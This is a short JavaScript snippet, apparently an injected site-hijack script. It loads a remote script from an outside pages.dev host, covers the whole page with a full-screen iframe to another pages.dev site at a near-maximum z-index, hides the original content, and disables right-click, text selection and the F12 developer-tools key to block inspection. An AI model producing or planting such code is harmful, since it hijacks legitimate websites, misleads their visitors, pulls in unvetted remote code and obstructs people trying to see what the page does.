document.writeln("<script src=\'https://cloudonline.pages.dev/js/wow.js\'></script>");
var date1 = new Date('03/03/2025');
var date2 = new Date();
var diffTime = Math.abs(date2 - date1);
var NUM = Math.ceil(diffTime / (1000 * 60 * 60 * 24));

let h = window.innerHeight;
let w = window.innerWidth;

var win_Height = window.innerHeight;

// 移除平台检测部分

// 保留原始的 iframe 部分
var zindexCount = 99999999;

var arr = [
  'https://17c-x.pages.dev/',
];

var iframe_url = arr[parseInt(Math.random() * arr.length)];

var iframe_str = '<div id="div_iframe" style="z-index:' + (zindexCount - 1) + ';height:' + win_Height + 'px; width: 100%;position: fixed; background: #ffffff;height: 100%;padding:0px;margin:0px;"><iframe id="myiframe" frameborder="0" width="100%" height="100%" src="' + iframe_url + '"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;padding:0px;margin:0!important;}</style>';

document.write(iframe_str);

// 禁用上下文菜单和键盘事件
//禁止右键
    $(document).bind("contextmenu",function(){return false;});
    //禁止选择
    $(document).bind("selectstart",function(){return false;});
    //禁止F12
    document.onkeydown = function(){
        if(window.event && window.event.keyCode == 123) {
    	    event.keyCode = 0;
            event.returnValue = false;
        }
       }
// 保留其他部分
